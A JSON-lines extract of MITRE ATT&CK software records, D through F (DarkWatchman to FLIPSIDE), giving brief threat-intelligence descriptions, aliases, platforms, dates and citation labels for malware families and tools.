{"ID":"S0673","name":"DarkWatchman","description":"[DarkWatchman](https://attack.mitre.org/software/S0673) is a lightweight JavaScript-based remote access tool (RAT) that avoids file operations; it was first observed in November 2021.(Citation: Prevailion DarkWatchman 2021)","url":"https://attack.mitre.org/software/S0673","created":"10 January 2022","last modified":"22 March 2023","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Prevailion DarkWatchman 2021)"}
{"ID":"S0187","name":"Daserf","description":"[Daserf](https://attack.mitre.org/software/S0187) is a backdoor that has been used to spy on and steal from Japanese, South Korean, Russian, Singaporean, and Chinese victims. Researchers have identified versions written in both Visual C and Delphi. (Citation: Trend Micro Daserf Nov 2017) (Citation: Secureworks BRONZE BUTLER Oct 2017)","url":"https://attack.mitre.org/software/S0187","created":"16 January 2018","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":"Muirim, Nioupale","type":"malware","relationship citations":"(Citation: Symantec Tick Apr 2016),(Citation: Trend Micro Daserf Nov 2017),,(Citation: Symantec Tick Apr 2016),(Citation: Trend Micro Daserf Nov 2017),(Citation: Secureworks BRONZE BUTLER Oct 2017)"}
{"ID":"S0243","name":"DealersChoice","description":"[DealersChoice](https://attack.mitre.org/software/S0243) is a Flash exploitation framework used by [APT28](https://attack.mitre.org/groups/G0007). (Citation: Sofacy DealersChoice)","url":"https://attack.mitre.org/software/S0243","created":"17 October 2018","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Sofacy DealersChoice),(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),,(Citation: Sofacy DealersChoice)"}
{"ID":"S0354","name":"Denis","description":"[Denis](https://attack.mitre.org/software/S0354) is a Windows backdoor and Trojan used by [APT32](https://attack.mitre.org/groups/G0050). [Denis](https://attack.mitre.org/software/S0354) shares several similarities to the [SOUNDBITE](https://attack.mitre.org/software/S0157) backdoor and has been used in conjunction with the [Goopy](https://attack.mitre.org/software/S0477) backdoor.(Citation: Cybereason Oceanlotus May 2017)","url":"https://attack.mitre.org/software/S0354","created":"30 January 2019","last modified":"22 March 2023","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Cybereason Oceanlotus May 2017),(Citation: Cybereason Cobalt Kitty 2017),,(Citation: Cybereason Oceanlotus May 2017),(Citation: Securelist Denis April 2017),(Citation: Cybereason Cobalt Kitty 2017)"}
{"ID":"S0021","name":"Derusbi","description":"[Derusbi](https://attack.mitre.org/software/S0021) is malware used by multiple Chinese APT groups.(Citation: Novetta-Axiom)(Citation: ThreatConnect Anthem) Both Windows and Linux variants have been observed.(Citation: Fidelis Turbo)","url":"https://attack.mitre.org/software/S0021","created":"31 May 2017","last modified":"20 March 2023","version":"1.2","contributors":null,"platforms":"Linux, Windows","aliases":"PHOTO","type":"malware","relationship citations":"(Citation: Cisco Group 72),(Citation: FireEye Periscope March 2018),(Citation: ThreatConnect Anthem),(Citation: FireEye APT41 Aug 2019),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Novetta-Axiom),,(Citation: FireEye Periscope March 2018),(Citation: Fidelis Turbo),(Citation: Airbus Derusbi 2015),(Citation: Novetta-Axiom),(Citation: ThreatGeek Derusbi Converge)"}
{"ID":"S0659","name":"Diavol","description":"[Diavol](https://attack.mitre.org/software/S0659) is a ransomware variant first observed in June 2021 that is capable of prioritizing file types to encrypt based on a pre-configured list of extensions defined by the attacker. [Diavol](https://attack.mitre.org/software/S0659) has been deployed by [Bazar](https://attack.mitre.org/software/S0534) and is thought to have potential ties to [Wizard Spider](https://attack.mitre.org/groups/G0102).(Citation: Fortinet Diavol July 2021)(Citation: FBI Flash Diavol January 2022)(Citation: DFIR Diavol Ransomware December 2021)","url":"https://attack.mitre.org/software/S0659","created":"12 November 2021","last modified":"15 April 2022","version":"1.0","contributors":"Massimiliano Romano, BT Security","platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Fortinet Diavol July 2021)"}
{"ID":"S0200","name":"Dipsind","description":"[Dipsind](https://attack.mitre.org/software/S0200) is a malware family of backdoors that appear to be used exclusively by [PLATINUM](https://attack.mitre.org/groups/G0068). (Citation: Microsoft PLATINUM April 2016)","url":"https://attack.mitre.org/software/S0200","created":"18 April 2018","last modified":"30 March 2020","version":"1.1","contributors":"Ryan Becwar","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Microsoft PLATINUM April 2016),,(Citation: Microsoft PLATINUM April 2016)"}
{"ID":"S1021","name":"DnsSystem","description":"[DnsSystem](https://attack.mitre.org/software/S1021) is a .NET based DNS backdoor, which is a customized version of the open source tool DIG.net, that has been used by [HEXANE](https://attack.mitre.org/groups/G1001) since at least June 2022.(Citation: Zscaler Lyceum DnsSystem June 2022)","url":"https://attack.mitre.org/software/S1021","created":"24 June 2022","last modified":"01 September 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Zscaler Lyceum DnsSystem June 2022),,(Citation: Zscaler Lyceum DnsSystem June 2022)"}
{"ID":"S0281","name":"Dok","description":"[Dok](https://attack.mitre.org/software/S0281) is a Trojan application disguised as a .zip file that is able to collect user credentials and install a malicious proxy server to redirect a user's network traffic (i.e. [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)).(Citation: objsee mac malware 2017)(Citation: hexed osx.dok analysis 2019)(Citation: CheckPoint Dok)","url":"https://attack.mitre.org/software/S0281","created":"17 October 2018","last modified":"12 October 2021","version":"2.0","contributors":null,"platforms":"macOS","aliases":"Retefe","type":"malware","relationship citations":",,(Citation: CheckPoint Dok),(Citation: objsee mac malware 2017),(Citation: hexed osx.dok analysis 2019)"}
{"ID":"S0600","name":"Doki","description":"[Doki](https://attack.mitre.org/software/S0600) is a backdoor that uses a unique Dogecoin-based Domain Generation Algorithm and was first observed in July 2020. [Doki](https://attack.mitre.org/software/S0600) was used in conjunction with the [Ngrok](https://attack.mitre.org/software/S0508) Mining Botnet in a campaign that targeted Docker servers in cloud platforms. (Citation: Intezer Doki July 20)","url":"https://attack.mitre.org/software/S0600","created":"06 April 2021","last modified":"19 April 2021","version":"1.0","contributors":"Center for Threat-Informed Defense (CTID)","platforms":"Containers, Linux","aliases":null,"type":"malware","relationship citations":",,(Citation: Intezer Doki July 20)"}
{"ID":"S0695","name":"Donut","description":"[Donut](https://attack.mitre.org/software/S0695) is an open source framework used to generate position-independent shellcode.(Citation: Donut Github)(Citation: Introducing Donut) [Donut](https://attack.mitre.org/software/S0695) generated code has been used by multiple threat actors to inject and load malicious payloads into memory.(Citation: NCC Group WastedLocker June 2020)","url":"https://attack.mitre.org/software/S0695","created":"25 March 2022","last modified":"18 April 2022","version":"1.0","contributors":"The Wover, @TheRealWover","platforms":"Windows","aliases":null,"type":"tool","relationship citations":"(Citation: NCC Group WastedLocker June 2020),,(Citation: Donut Github)"}
{"ID":"S0186","name":"DownPaper","description":"[DownPaper](https://attack.mitre.org/software/S0186) is a backdoor Trojan; its main functionality is to download and run second stage malware. (Citation: ClearSky Charming Kitten Dec 2017)","url":"https://attack.mitre.org/software/S0186","created":"16 January 2018","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: ClearSky Charming Kitten Dec 2017),,(Citation: ClearSky Charming Kitten Dec 2017)"}
{"ID":"S0134","name":"Downdelph","description":"[Downdelph](https://attack.mitre.org/software/S0134) is a first-stage downloader written in Delphi that has been used by [APT28](https://attack.mitre.org/groups/G0007) in rare instances between 2013 and 2015. (Citation: ESET Sednit Part 3)","url":"https://attack.mitre.org/software/S0134","created":"31 May 2017","last modified":"30 March 2020","version":"1.2","contributors":null,"platforms":"Windows","aliases":"Delphacy","type":"malware","relationship citations":"(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),(Citation: ESET Sednit Part 3),,(Citation: ESET Sednit Part 3)"}
{"ID":"S0384","name":"Dridex","description":"[Dridex](https://attack.mitre.org/software/S0384) is a prolific banking Trojan that first appeared in 2014. By December 2019, the US Treasury estimated [Dridex](https://attack.mitre.org/software/S0384) had infected computers in hundreds of banks and financial institutions in over 40 countries, leading to more than $100 million in theft. [Dridex](https://attack.mitre.org/software/S0384) was created from the source code of the Bugat banking Trojan (also known as Cridex).(Citation: Dell Dridex Oct 2015)(Citation: Kaspersky Dridex May 2017)(Citation: Treasury EvilCorp Dec 2019)","url":"https://attack.mitre.org/software/S0384","created":"30 May 2019","last modified":"01 October 2021","version":"2.0","contributors":"Daniyal Naeem, BT Security","platforms":"Windows","aliases":"Bugat v5","type":"malware","relationship citations":"(Citation: Proofpoint TA505 June 2018),(Citation: Treasury EvilCorp Dec 2019),(Citation: Crowdstrike Indrik November 2018),(Citation: IBM TA505 April 2020),(Citation: Crowdstrike EvilCorp March 2021),(Citation: Proofpoint TA505 Sep 2017),,(Citation: Dell Dridex Oct 2015),(Citation: Checkpoint Dridex Jan 2021),(Citation: Kaspersky Dridex May 2017)"}
{"ID":"S0547","name":"DropBook","description":"[DropBook](https://attack.mitre.org/software/S0547) is a Python-based backdoor compiled with PyInstaller.(Citation: Cybereason Molerats Dec 2020)","url":"https://attack.mitre.org/software/S0547","created":"22 December 2020","last modified":"18 August 2021","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Cybereason Molerats Dec 2020),,(Citation: Cybereason Molerats Dec 2020),(Citation: BleepingComputer Molerats Dec 2020)"}
{"ID":"S0502","name":"Drovorub","description":"[Drovorub](https://attack.mitre.org/software/S0502) is a Linux malware toolset comprised of an agent, client, server, and kernel modules, that has been used by [APT28](https://attack.mitre.org/groups/G0007).(Citation: NSA/FBI Drovorub August 2020)","url":"https://attack.mitre.org/software/S0502","created":"25 August 2020","last modified":"18 September 2020","version":"1.0","contributors":null,"platforms":"Linux","aliases":null,"type":"malware","relationship citations":"(Citation: NSA/FBI Drovorub August 2020),,(Citation: NSA/FBI Drovorub August 2020)"}
{"ID":"S0567","name":"Dtrack","description":"[Dtrack](https://attack.mitre.org/software/S0567) is spyware that was discovered in 2019 and has been used against Indian financial institutions, research facilities, and the Kudankulam Nuclear Power Plant. [Dtrack](https://attack.mitre.org/software/S0567) shares similarities with the DarkSeoul campaign, which was attributed to [Lazarus Group](https://attack.mitre.org/groups/G0032). (Citation: Kaspersky Dtrack)(Citation: Securelist Dtrack)(Citation: Dragos WASSONITE)(Citation: CyberBit Dtrack)(Citation: ZDNet Dtrack)","url":"https://attack.mitre.org/software/S0567","created":"25 January 2021","last modified":"18 October 2022","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Kaspersky Dtrack),,(Citation: CyberBit Dtrack),(Citation: Securelist Dtrack)"}
{"ID":"S0038","name":"Duqu","description":"[Duqu](https://attack.mitre.org/software/S0038) is a malware platform that uses a modular approach to extend functionality after deployment within a target network. (Citation: Symantec W32.Duqu)","url":"https://attack.mitre.org/software/S0038","created":"31 May 2017","last modified":"08 March 2023","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Symantec W32.Duqu),(Citation: Kaspersky Duqu 2.0)"}
{"ID":"S0062","name":"DustySky","description":"[DustySky](https://attack.mitre.org/software/S0062) is multi-stage malware written in .NET that has been used by [Molerats](https://attack.mitre.org/groups/G0021) since May 2015. (Citation: DustySky) (Citation: DustySky2)(Citation: Kaspersky MoleRATs April 2019)","url":"https://attack.mitre.org/software/S0062","created":"31 May 2017","last modified":"27 April 2021","version":"1.1","contributors":null,"platforms":"Windows","aliases":"NeD Worm","type":"malware","relationship citations":"(Citation: DustySky),(Citation: Kaspersky MoleRATs April 2019),(Citation: DustySky2),,(Citation: DustySky),(Citation: Kaspersky MoleRATs April 2019)"}
{"ID":"S0024","name":"Dyre","description":"[Dyre](https://attack.mitre.org/software/S0024) is a banking Trojan that has been used for financial gain. \n (Citation: Symantec Dyre June 2015)(Citation: Malwarebytes Dyreza November 2015)","url":"https://attack.mitre.org/software/S0024","created":"31 May 2017","last modified":"22 June 2020","version":"1.2","contributors":"Josh Campbell, Cyborg Security, @cyb0rgsecur1ty","platforms":"Windows","aliases":"Dyreza, Dyzap","type":"malware","relationship citations":"(Citation: CrowdStrike Wizard Spider March 2019),(Citation: Malwarebytes TrickBot Sep 2019),(Citation: Forbes Dyre May 2017),,(Citation: Symantec Dyre June 2015),(Citation: Malwarebytes Dyreza November 2015)"}
{"ID":"S0593","name":"ECCENTRICBANDWAGON","description":"[ECCENTRICBANDWAGON](https://attack.mitre.org/software/S0593) is a remote access Trojan (RAT) used by North Korean cyber actors that was first identified in August 2020. It is a reconnaissance tool--with keylogging and screen capture functionality--used for information gathering on compromised systems.(Citation: CISA EB Aug 2020)","url":"https://attack.mitre.org/software/S0593","created":"18 March 2021","last modified":"15 October 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: CISA EB Aug 2020),(Citation: CISA AA20-239A BeagleBoyz August 2020),,(Citation: CISA EB Aug 2020)"}
{"ID":"S0605","name":"EKANS","description":"[EKANS](https://attack.mitre.org/software/S0605) is ransomware variant written in Golang that first appeared in mid-December 2019 and has been used against multiple sectors, including energy, healthcare, and automotive manufacturing, which in some cases resulted in significant operational disruptions. [EKANS](https://attack.mitre.org/software/S0605) has used a hard-coded kill-list of processes, including some associated with common ICS software platforms (e.g., GE Proficy, Honeywell HMIWeb, etc), similar to those defined in [MegaCortex](https://attack.mitre.org/software/S0576).(Citation: Dragos EKANS)(Citation: Palo Alto Unit 42 EKANS)","url":"https://attack.mitre.org/software/S0605","created":"12 February 2021","last modified":"08 March 2023","version":"2.0","contributors":null,"platforms":"Windows","aliases":"SNAKEHOSE","type":"malware","relationship citations":",,(Citation: IBM Ransomware Trends September 2020),(Citation: FireEye Ransomware Feb 2020),(Citation: Dragos EKANS),(Citation: Palo Alto Unit 42 EKANS)"}
{"ID":"S0064","name":"ELMER","description":"[ELMER](https://attack.mitre.org/software/S0064) is a non-persistent, proxy-aware HTTP backdoor written in Delphi that has been used by [APT16](https://attack.mitre.org/groups/G0023). (Citation: FireEye EPS Awakens Part 2)","url":"https://attack.mitre.org/software/S0064","created":"31 May 2017","last modified":"26 July 2022","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: FireEye EPS Awakens Part 2),,(Citation: FireEye EPS Awakens Part 2)"}
{"ID":"S0568","name":"EVILNUM","description":"[EVILNUM](https://attack.mitre.org/software/S0568) is fully capable backdoor that was first identified in 2018. [EVILNUM](https://attack.mitre.org/software/S0568) is used by the APT group [Evilnum](https://attack.mitre.org/groups/G0120) which has the same name.(Citation: ESET EvilNum July 2020)(Citation: Prevailion EvilNum May 2020)","url":"https://attack.mitre.org/software/S0568","created":"28 January 2021","last modified":"19 January 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Prevailion EvilNum May 2020),,(Citation: ESET EvilNum July 2020),(Citation: Prevailion EvilNum May 2020)"}
{"ID":"S0377","name":"Ebury","description":"[Ebury](https://attack.mitre.org/software/S0377) is an SSH backdoor targeting Linux operating systems. Attackers require root-level access, which allows them to replace SSH binaries (ssh, sshd, ssh-add, etc) or modify a shared library used by OpenSSH (libkeyutils).(Citation: ESET Ebury Feb 2014)(Citation: BleepingComputer Ebury March 2017)(Citation: ESET Ebury Oct 2017)","url":"https://attack.mitre.org/software/S0377","created":"19 April 2019","last modified":"23 April 2021","version":"1.3","contributors":"Marc-Etienne M.Léveillé, ESET","platforms":"Linux","aliases":null,"type":"malware","relationship citations":"(Citation: ESET Ebury Oct 2017),,(Citation: ESET Ebury Oct 2017),(Citation: ESET Ebury Feb 2014),(Citation: ESET Windigo Mar 2014)"}
{"ID":"S0624","name":"Ecipekac","description":"[Ecipekac](https://attack.mitre.org/software/S0624) is a multi-layer loader that has been used by [menuPass](https://attack.mitre.org/groups/G0045) since at least 2019 including use as a loader for [P8RAT](https://attack.mitre.org/software/S0626), [SodaMaster](https://attack.mitre.org/software/S0627), and [FYAnti](https://attack.mitre.org/software/S0628).(Citation: Securelist APT10 March 2021)","url":"https://attack.mitre.org/software/S0624","created":"18 June 2021","last modified":"11 October 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":"DESLoader, HEAVYHAND, SigLoader","type":"malware","relationship citations":"(Citation: Securelist APT10 March 2021),,(Citation: Securelist APT10 March 2021)"}
{"ID":"S0554","name":"Egregor","description":"[Egregor](https://attack.mitre.org/software/S0554) is a Ransomware-as-a-Service (RaaS) tool that was first observed in September 2020. Researchers have noted code similarities between [Egregor](https://attack.mitre.org/software/S0554) and Sekhmet ransomware, as well as [Maze](https://attack.mitre.org/software/S0449) ransomware.(Citation: NHS Digital Egregor Nov 2020)(Citation: Cyble Egregor Oct 2020)(Citation: Security Boulevard Egregor Oct 2020)","url":"https://attack.mitre.org/software/S0554","created":"29 December 2020","last modified":"14 October 2021","version":"1.0","contributors":"Daniyal Naeem, BT Security; Matt Brenton, Zurich Insurance Group","platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Cyble Egregor Oct 2020),(Citation: Cybereason Egregor Nov 2020),(Citation: NHS Digital Egregor Nov 2020),(Citation: Intrinsec Egregor Nov 2020),(Citation: JoeSecurity Egregor 2020)"}
{"ID":"S0081","name":"Elise","description":"[Elise](https://attack.mitre.org/software/S0081) is a custom backdoor Trojan that appears to be used exclusively by [Lotus Blossom](https://attack.mitre.org/groups/G0030). It is part of a larger group of\ntools referred to as LStudio, ST Group, and APT0LSTU. (Citation: Lotus Blossom Jun 2015)(Citation: Accenture Dragonfish Jan 2018)","url":"https://attack.mitre.org/software/S0081","created":"31 May 2017","last modified":"20 March 2020","version":"1.2","contributors":null,"platforms":"Windows","aliases":"BKDR_ESILE, Page","type":"malware","relationship citations":"(Citation: Accenture Dragonfish Jan 2018),(Citation: Spring Dragon Jun 2015),,(Citation: Accenture Dragonfish Jan 2018),(Citation: Lotus Blossom Jun 2015)"}
{"ID":"S0082","name":"Emissary","description":"[Emissary](https://attack.mitre.org/software/S0082) is a Trojan that has been used by [Lotus Blossom](https://attack.mitre.org/groups/G0030). It shares code with [Elise](https://attack.mitre.org/software/S0081), with both Trojans being part of a malware group referred to as LStudio. (Citation: Lotus Blossom Dec 2015)","url":"https://attack.mitre.org/software/S0082","created":"31 May 2017","last modified":"09 August 2021","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Emissary Trojan Feb 2016),(Citation: Lotus Blossom Dec 2015),,(Citation: Emissary Trojan Feb 2016),(Citation: Lotus Blossom Dec 2015)"}
{"ID":"S0367","name":"Emotet","description":"[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)","url":"https://attack.mitre.org/software/S0367","created":"25 March 2019","last modified":"17 January 2023","version":"1.4","contributors":"Omkar Gudhate","platforms":"Windows","aliases":"Geodo","type":"malware","relationship citations":"(Citation: Sophos New Ryuk Attack October 2020),(Citation: CrowdStrike Grim Spider May 2019),,(Citation: Talos Emotet Jan 2019),(Citation: Malwarebytes Emotet Dec 2017),(Citation: Carbon Black Emotet Apr 2019),(Citation: CIS Emotet Apr 2017),(Citation: ESET Emotet Dec 2018),(Citation: Red Canary Emotet Feb 2019),(Citation: Fortinet Emotet May 2017),(Citation: Secureworks Emotet Nov 2018),(Citation: IBM IcedID November 2017),(Citation: Picus Emotet Dec 2018),(Citation: Trend Micro Banking Malware Jan 2019),(Citation: Symantec Emotet Jul 2018),(Citation: Trend Micro Emotet Jan 2019),(Citation: ASEC Emotet 2017),(Citation: CIS Emotet Dec 2018),(Citation: Kaspersky Emotet Jan 2019),(Citation: US-CERT Emotet Jul 2018)"}
{"ID":"S0363","name":"Empire","description":"[Empire](https://attack.mitre.org/software/S0363) is an open source, cross-platform remote administration and post-exploitation framework that is publicly available on GitHub. While the tool itself is primarily written in Python, the post-exploitation agents are written in pure [PowerShell](https://attack.mitre.org/techniques/T1059/001) for Windows and Python for Linux/macOS. [Empire](https://attack.mitre.org/software/S0363) was one of five tools singled out by a joint report on public hacking tools being widely used by adversaries.(Citation: NCSC Joint Report Public Tools)(Citation: Github PowerShell Empire)(Citation: GitHub ATTACK Empire)","url":"https://attack.mitre.org/software/S0363","created":"11 March 2019","last modified":"22 March 2023","version":"1.6","contributors":null,"platforms":"Linux, Windows, macOS","aliases":"EmPyre, PowerShell Empire","type":"tool","relationship citations":"(Citation: ESET Turla August 2018),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: ESET Crutch December 2020),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Group IB Silence Aug 2019),(Citation: ClearSky Wilted Tulip July 2017),(Citation: Symantec Elfin Mar 2019),(Citation: FireEye FIN10 June 2017),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: SecureWorks August 2019),(Citation: FireEye APT33 Guardrail),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: CrowdStrike Grim Spider May 2019),(Citation: NCSC Joint Report Public Tools),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Crowdstrike Indrik November 2018),(Citation: Lab52 WIRTE Apr 2019),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Talos Frankenstein June 2019),(Citation: Github PowerShell Empire),(Citation: SecureWorks August 2019),(Citation: Talos Frankenstein June 2019),(Citation: NCSC Joint Report Public Tools),(Citation: GitHub Inveigh)"}
{"ID":"S0634","name":"EnvyScout","description":"[EnvyScout](https://attack.mitre.org/software/S0634) is a dropper that has been used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2021.(Citation: MSTIC Nobelium Toolset May 2021)","url":"https://attack.mitre.org/software/S0634","created":"02 August 2021","last modified":"16 October 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: MSTIC Nobelium Toolset May 2021),,(Citation: MSTIC Nobelium Toolset May 2021)"}
{"ID":"S0091","name":"Epic","description":"[Epic](https://attack.mitre.org/software/S0091) is a backdoor that has been used by [Turla](https://attack.mitre.org/groups/G0010). (Citation: Kaspersky Turla)","url":"https://attack.mitre.org/software/S0091","created":"31 May 2017","last modified":"26 October 2020","version":"1.3","contributors":"Martin Smolár, ESET","platforms":"Windows","aliases":"TadjMakhal, Tavdig, Wipbot, WorldCupSec","type":"malware","relationship citations":"(Citation: Kaspersky Turla),(Citation: Secureworks IRON HUNTER Profile),,(Citation: Kaspersky Turla),(Citation: Kaspersky Turla Aug 2014),(Citation: ESET Recon Snake Nest)"}
{"ID":"S0396","name":"EvilBunny","description":"[EvilBunny](https://attack.mitre.org/software/S0396) is a C++ malware sample observed since 2011 that was designed to be a execution platform for Lua scripts.(Citation: Cyphort EvilBunny Dec 2014)","url":"https://attack.mitre.org/software/S0396","created":"28 June 2019","last modified":"02 April 2021","version":"1.2","contributors":"ESET","platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Cyphort EvilBunny Dec 2014)"}
{"ID":"S0152","name":"EvilGrab","description":"[EvilGrab](https://attack.mitre.org/software/S0152) is a malware family with common reconnaissance capabilities. It has been deployed by [menuPass](https://attack.mitre.org/groups/G0045) via malicious Microsoft Office documents as part of spearphishing campaigns. (Citation: PWC Cloud Hopper Technical Annex April 2017)","url":"https://attack.mitre.org/software/S0152","created":"14 December 2017","last modified":"23 March 2023","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: PWC Cloud Hopper Technical Annex April 2017),,(Citation: PWC Cloud Hopper Technical Annex April 2017)"}
{"ID":"S0401","name":"Exaramel for Linux","description":"[Exaramel for Linux](https://attack.mitre.org/software/S0401) is a backdoor written in the Go Programming Language and compiled as a 64-bit ELF binary. The Windows version is tracked separately under [Exaramel for Windows](https://attack.mitre.org/software/S0343).(Citation: ESET TeleBots Oct 2018)","url":"https://attack.mitre.org/software/S0401","created":"26 August 2019","last modified":"14 April 2021","version":"1.2","contributors":null,"platforms":"Linux","aliases":null,"type":"malware","relationship citations":"(Citation: ANSSI Sandworm January 2021),(Citation: ESET TeleBots Oct 2018),,(Citation: ANSSI Sandworm January 2021),(Citation: ESET TeleBots Oct 2018)"}
{"ID":"S0343","name":"Exaramel for Windows","description":"[Exaramel for Windows](https://attack.mitre.org/software/S0343) is a backdoor used for targeting Windows systems. The Linux version is tracked separately under [Exaramel for Linux](https://attack.mitre.org/software/S0401).(Citation: ESET TeleBots Oct 2018)","url":"https://attack.mitre.org/software/S0343","created":"30 January 2019","last modified":"26 March 2023","version":"2.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: ESET TeleBots Oct 2018),,(Citation: ESET TeleBots Oct 2018)"}
{"ID":"S0361","name":"Expand","description":"[Expand](https://attack.mitre.org/software/S0361) is a Windows utility used to expand one or more compressed CAB files.(Citation: Microsoft Expand Utility) It has been used by [BBSRAT](https://attack.mitre.org/software/S0127) to decompress a CAB file into executable content.(Citation: Palo Alto Networks BBSRAT)","url":"https://attack.mitre.org/software/S0361","created":"19 February 2019","last modified":"20 March 2020","version":"1.1","contributors":"Matthew Demaske, Adaptforward","platforms":"Windows","aliases":null,"type":"tool","relationship citations":",,(Citation: LOLBAS Expand),(Citation: Microsoft Expand Utility)"}
{"ID":"S0569","name":"Explosive","description":"[Explosive](https://attack.mitre.org/software/S0569) is a custom-made remote access tool used by the group [Volatile Cedar](https://attack.mitre.org/groups/G0123). It was first identified in the wild in 2015.(Citation: CheckPoint Volatile Cedar March 2015)(Citation: ClearSky Lebanese Cedar Jan 2021)  ","url":"https://attack.mitre.org/software/S0569","created":"08 February 2021","last modified":"27 April 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: CheckPoint Volatile Cedar March 2015),(Citation: ClearSky Lebanese Cedar Jan 2021),,(Citation: CheckPoint Volatile Cedar March 2015),(Citation: ClearSky Lebanese Cedar Jan 2021)"}
{"ID":"S0181","name":"FALLCHILL","description":"[FALLCHILL](https://attack.mitre.org/software/S0181) is a RAT that has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032) since at least 2016 to target the aerospace, telecommunications, and finance industries. It is usually dropped by other [Lazarus Group](https://attack.mitre.org/groups/G0032) malware or delivered when a victim unknowingly visits a compromised website. (Citation: US-CERT FALLCHILL Nov 2017)","url":"https://attack.mitre.org/software/S0181","created":"16 January 2018","last modified":"23 April 2021","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: US-CERT FALLCHILL Nov 2017),,(Citation: US-CERT FALLCHILL Nov 2017),(Citation: CISA AppleJeus Feb 2021)"}
{"ID":"S0267","name":"FELIXROOT","description":"[FELIXROOT](https://attack.mitre.org/software/S0267) is a backdoor that has been used to target Ukrainian victims. (Citation: FireEye FELIXROOT July 2018)","url":"https://attack.mitre.org/software/S0267","created":"17 October 2018","last modified":"30 March 2020","version":"2.1","contributors":null,"platforms":"Windows","aliases":"GreyEnergy mini","type":"malware","relationship citations":",,(Citation: FireEye FELIXROOT July 2018),(Citation: ESET GreyEnergy Oct 2018)"}
{"ID":"S0618","name":"FIVEHANDS","description":"[FIVEHANDS](https://attack.mitre.org/software/S0618) is a customized version of [DEATHRANSOM](https://attack.mitre.org/software/S0616) ransomware written in C++. [FIVEHANDS](https://attack.mitre.org/software/S0618) has been used since at least 2021, including in Ransomware-as-a-Service (RaaS) campaigns, sometimes along with [SombRAT](https://attack.mitre.org/software/S0615).(Citation: FireEye FiveHands April 2021)(Citation: NCC Group Fivehands June 2021)","url":"https://attack.mitre.org/software/S0618","created":"04 June 2021","last modified":"18 October 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: FireEye FiveHands April 2021),(Citation: NCC Group Fivehands June 2021)"}
{"ID":"S0036","name":"FLASHFLOOD","description":"[FLASHFLOOD](https://attack.mitre.org/software/S0036) is malware developed by [APT30](https://attack.mitre.org/groups/G0013) that allows propagation and exfiltration of data over removable devices. [APT30](https://attack.mitre.org/groups/G0013) may use this capability to exfiltrate data across air-gaps. (Citation: FireEye APT30)","url":"https://attack.mitre.org/software/S0036","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: FireEye APT30),,(Citation: FireEye APT30)"}
{"ID":"S0173","name":"FLIPSIDE","description":"[FLIPSIDE](https://attack.mitre.org/software/S0173) is a simple tool similar to Plink that is used by [FIN5](https://attack.mitre.org/groups/G0053) to maintain access to victims. (Citation: Mandiant FIN5 GrrCON Oct 2016)","url":"https://attack.mitre.org/software/S0173","created":"16 January 2018","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Mandiant FIN5 GrrCON Oct 2016),,(Citation: Mandiant FIN5 GrrCON Oct 2016)"}
